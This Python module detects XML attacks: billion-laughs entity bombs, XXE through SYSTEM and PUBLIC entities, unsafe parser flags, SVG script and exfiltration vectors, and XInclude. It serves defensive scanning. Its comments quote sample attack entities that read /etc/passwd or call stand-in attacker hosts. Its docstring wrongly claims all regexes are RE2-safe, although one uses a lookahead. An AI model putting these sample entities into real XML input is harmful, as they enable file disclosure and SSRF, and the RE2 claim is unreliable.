"""XML entity expansion / billion-laughs / SVG-DoS patterns.

Wave-30 distillation round 16.

Catalogue of 8 patterns covering XML-entity expansion attacks, DTD injection,
SVG-based DoS, and related XML processing anti-patterns that allow resource
exhaustion or SSRF via maliciously crafted XML/SVG documents.

What is NOT here (already covered elsewhere):
  * Generic XXE / SSRF detection via outbound HTTP — agent_config_patterns.py
  * Generic path traversal from file:// URIs — separate module

What IS here (8 net-new rules, regex-only, all RE2-safe):

  * xml-entity-billion-laughs-dtd              (CRITICAL)
  * xml-entity-external-entity-dtd-system      (HIGH)
  * xml-entity-external-entity-dtd-public      (HIGH)
  * xml-entity-doctype-allowed-in-parser       (HIGH)
  * xml-entity-svg-foreignobject-script        (CRITICAL)
  * xml-entity-svg-animate-href-exfil          (HIGH)
  * xml-entity-xinclude-without-disable        (HIGH)
  * xml-entity-lxml-resolve-entities-true      (MEDIUM)

Public surface:
  * Rule(id, name, severity, description, pattern, owasp_asi)
  * RULES — ordered tuple of every rule.
  * scan_text(text) -> list[Finding]
  * Finding(rule_id, line, column, matched_text, severity, description,
            owasp_asi) — frozen NamedTuple.

OWASP ASI mapping used:
  ASI-01 — Injection (entity expansion, DTD-based injection, XInclude)
  ASI-02 — Secret/data exfiltration (SVG animate href exfil, external entity)
  ASI-05 — Supply-chain / DoS (billion-laughs, SVG foreignObject script)
  ASI-06 — Insecure parser configuration (resolve_entities, doctype allowed)

All regexes are RE2-compatible (no backreferences, no lookbehind, no
catastrophic backtracking shapes). Patterns are PRE-COMPILED at module
load. Fail-fast: callers receive structured Finding tuples, never raised
exceptions on benign input.
"""

from __future__ import annotations

import re
from typing import NamedTuple

# ---- Data model ---------------------------------------------------------


class Finding(NamedTuple):
    """A single rule match — same shape as webhook_signature_patterns.Finding."""

    rule_id: str
    line: int
    column: int
    matched_text: str
    severity: str
    description: str
    owasp_asi: str


class Rule(NamedTuple):
    """A rule definition. Patterns are PRE-COMPILED at module load."""

    id: str
    name: str
    severity: str
    description: str
    pattern: re.Pattern  # noqa: UP006 — keep stdlib name
    owasp_asi: str


def _re(pattern: str) -> re.Pattern:  # noqa: UP006
    """Compile with IGNORECASE+MULTILINE+UNICODE. RE2-safe: no nested
    quantifiers, no backreferences, no lookbehind."""
    return re.compile(pattern, re.IGNORECASE | re.MULTILINE | re.UNICODE)


# ---- X1 : xml-entity-billion-laughs-dtd ---------------------------------
# Detects inline DTD definitions with nested entity references of the form
#   <!ENTITY lol2 "&lol1;&lol1;&lol1;...">
# The repeated &name; references inside an ENTITY definition are the
# hallmark of the billion-laughs / XML bomb pattern.
# Pattern: <!ENTITY followed by content containing two or more &word; refs.
_BILLION_LAUGHS_ENTITY = _re(
    r"<!ENTITY\s+\w[\w.\-]*\s+"
    r"['\"](?:[^'\"]*&\w[\w.\-]*;){2,}[^'\"]*['\"]"
)

# ---- X2 : xml-entity-external-entity-dtd-system -------------------------
# Detects SYSTEM external entity declarations that can trigger XXE / SSRF.
#   <!ENTITY foo SYSTEM "file:///etc/passwd">
#   <!ENTITY foo SYSTEM "http://attacker.com/evil">
_EXTERNAL_ENTITY_SYSTEM = _re(
    r"<!ENTITY\s+(?:%\s+)?\w[\w.\-]*\s+SYSTEM\s+['\"][^'\"]{1,300}['\"]"
)

# ---- X3 : xml-entity-external-entity-dtd-public -------------------------
# Detects PUBLIC external entity declarations that can also pull remote DTDs.
#   <!ENTITY foo PUBLIC "-//FOO//EN" "http://evil.com/foo.dtd">
_EXTERNAL_ENTITY_PUBLIC = _re(
    r"<!ENTITY\s+(?:%\s+)?\w[\w.\-]*\s+PUBLIC\s+['\"][^'\"]*['\"]"
    r"\s+['\"][^'\"]{1,300}['\"]"
)

# ---- X4 : xml-entity-doctype-allowed-in-parser --------------------------
# Detects parser configurations where DOCTYPE processing is explicitly
# enabled (the insecure default in many XML libraries).
# Covers: defusedxml feature flags, lxml DTD loading, expat external DTD.
_DOCTYPE_ALLOWED = _re(
    r"(?:resolve_entities\s*=\s*True"
    r"|load_dtd\s*=\s*True"
    r"|no_network\s*=\s*False"
    r"|forbid_dtd\s*=\s*False"
    r"|forbid_entities\s*=\s*False"
    r"|XMLInputFactory\s*\.\s*IS_SUPPORTING_EXTERNAL_ENTITIES\s*,\s*true"
    r"|xml\.parsers\.expat.*ExternalEntityParserCreate"
    r"|FEATURE_EXTERNAL_GENERAL_ENTITIES\s*,\s*true)"
)

# ---- X5 : xml-entity-svg-foreignobject-script ---------------------------
# Detects SVG files or inline SVG embedding a <foreignObject> that contains
# a <script> element — classic SVG XSS / DoS vector.
_SVG_FOREIGNOBJECT_SCRIPT = _re(
    r"<foreignObject[^>]*>(?:[^<]|<(?!/?foreignObject))*<script"
)

# ---- X6 : xml-entity-svg-animate-href-exfil -----------------------------
# Detects SVG <animate> or <set> elements using xlink:href or href to
# animate a URI attribute — used to exfiltrate data to attacker-controlled
# endpoints via browser rendering.
_SVG_ANIMATE_HREF_EXFIL = _re(
    r"<(?:animate|set)\b[^>]*\b(?:xlink:href|href)\s*=\s*['\"](?:https?:|//)[^'\"]{1,300}['\"]"
)

# ---- X7 : xml-entity-xinclude-without-disable ---------------------------
# Detects XInclude usage (xi:include or xmlns:xi) without a corresponding
# disable-xinclude flag — XInclude can pull arbitrary local or remote files.
_XINCLUDE_WITHOUT_DISABLE = _re(
    r"(?:xi:include|xmlns:xi\s*=\s*['\"]http://www\.w3\.org/2001/XInclude['\"])"
)

# ---- X8 : xml-entity-lxml-resolve-entities-true -------------------------
# Detects lxml etree.XMLParser() calls that explicitly pass
# resolve_entities=True — overrides the safe default added in lxml 4.x.
_LXML_RESOLVE_ENTITIES_TRUE = _re(
    r"etree\s*\.\s*XMLParser\s*\([^)]*\bresolve_entities\s*=\s*True"
)


# ---- Rule registry -------------------------------------------------------

RULES: tuple[Rule, ...] = (
    Rule(
        id="xml-entity-billion-laughs-dtd",
        name="XML entity billion-laughs (XML bomb) in inline DTD",
        severity="CRITICAL",
        description=(
            "Inline DTD defines an entity whose value contains two or more "
            "references to other entities, creating exponential expansion "
            "(billion-laughs / XML bomb). Parsing this input can exhaust "
            "memory and CPU, causing denial of service."
        ),
        pattern=_BILLION_LAUGHS_ENTITY,
        owasp_asi="ASI-05",
    ),
    Rule(
        id="xml-entity-external-entity-dtd-system",
        name="XML external entity via SYSTEM identifier (XXE / SSRF)",
        severity="HIGH",
        description=(
            "DTD declares an external entity with a SYSTEM identifier. "
            "When resolved by a non-hardened parser this enables XXE — "
            "reading local files (file://) or triggering SSRF (http://)."
        ),
        pattern=_EXTERNAL_ENTITY_SYSTEM,
        owasp_asi="ASI-01",
    ),
    Rule(
        id="xml-entity-external-entity-dtd-public",
        name="XML external entity via PUBLIC identifier (remote DTD pull)",
        severity="HIGH",
        description=(
            "DTD declares an external entity with a PUBLIC identifier. "
            "A permissive parser may fetch the remote DTD URL, enabling "
            "SSRF, data exfiltration, or loading a malicious DTD."
        ),
        pattern=_EXTERNAL_ENTITY_PUBLIC,
        owasp_asi="ASI-02",
    ),
    Rule(
        id="xml-entity-doctype-allowed-in-parser",
        name="XML parser configured to allow DTD / external entities",
        severity="HIGH",
        description=(
            "Parser is configured to allow DTD processing or external "
            "entity resolution. Flags like resolve_entities=True, "
            "load_dtd=True, or forbid_dtd=False re-enable XXE attack "
            "surface that secure defaults disabled."
        ),
        pattern=_DOCTYPE_ALLOWED,
        owasp_asi="ASI-06",
    ),
    Rule(
        id="xml-entity-svg-foreignobject-script",
        name="SVG foreignObject containing a script element (SVG XSS / DoS)",
        severity="CRITICAL",
        description=(
            "SVG embeds a <foreignObject> containing a <script> element. "
            "When the SVG is rendered in a browser this executes arbitrary "
            "JavaScript, enabling XSS or resource exhaustion attacks."
        ),
        pattern=_SVG_FOREIGNOBJECT_SCRIPT,
        owasp_asi="ASI-05",
    ),
    Rule(
        id="xml-entity-svg-animate-href-exfil",
        name="SVG animate/set element with remote href (data exfiltration)",
        severity="HIGH",
        description=(
            "SVG <animate> or <set> element uses an xlink:href / href "
            "pointing to a remote URL. When rendered, the browser may "
            "dispatch requests to the attacker's server, leaking cookies, "
            "tokens, or document state."
        ),
        pattern=_SVG_ANIMATE_HREF_EXFIL,
        owasp_asi="ASI-02",
    ),
    Rule(
        id="xml-entity-xinclude-without-disable",
        name="XInclude usage without explicit disable flag",
        severity="HIGH",
        description=(
            "Document uses XInclude (xi:include or the XInclude namespace) "
            "without a corresponding parser flag that disables network "
            "resolution. XInclude can pull arbitrary local or remote files "
            "into the parsed document."
        ),
        pattern=_XINCLUDE_WITHOUT_DISABLE,
        owasp_asi="ASI-01",
    ),
    Rule(
        id="xml-entity-lxml-resolve-entities-true",
        name="lxml XMLParser instantiated with resolve_entities=True",
        severity="MEDIUM",
        description=(
            "lxml etree.XMLParser() is called with resolve_entities=True, "
            "overriding the secure default introduced in lxml 4.x. This "
            "re-enables entity expansion and XXE on the parser instance."
        ),
        pattern=_LXML_RESOLVE_ENTITIES_TRUE,
        owasp_asi="ASI-06",
    ),
)


# ---- Helpers -------------------------------------------------------------


def _line_col(text: str, offset: int) -> tuple[int, int]:
    """Convert a string offset into (1-based line, 1-based column)."""
    prefix = text[:offset]
    line = prefix.count("\n") + 1
    col = offset - prefix.rfind("\n")
    return line, col


# ---- Public API ----------------------------------------------------------


def scan_text(text: str) -> list[Finding]:
    """Run every RULES pattern against *text* and return all findings.

    Findings are deduped by (rule_id, line, col). Each Rule is applied
    independently; no multi-line context filters are required for this
    pattern set because every rule is self-contained in its match.
    """
    if not text:
        return []

    findings: list[Finding] = []
    seen: set[tuple[str, int, int]] = set()

    def _emit(rule: Rule, offset: int, matched: str) -> None:
        line, col = _line_col(text, offset)
        key = (rule.id, line, col)
        if key in seen:
            return
        seen.add(key)
        snippet = matched if len(matched) <= 200 else matched[:200] + "…"
        findings.append(
            Finding(
                rule_id=rule.id,
                line=line,
                column=col,
                matched_text=snippet,
                severity=rule.severity,
                description=rule.description,
                owasp_asi=rule.owasp_asi,
            )
        )

    for rule in RULES:
        for m in rule.pattern.finditer(text):
            _emit(rule, m.start(), m.group(0))

    return findings
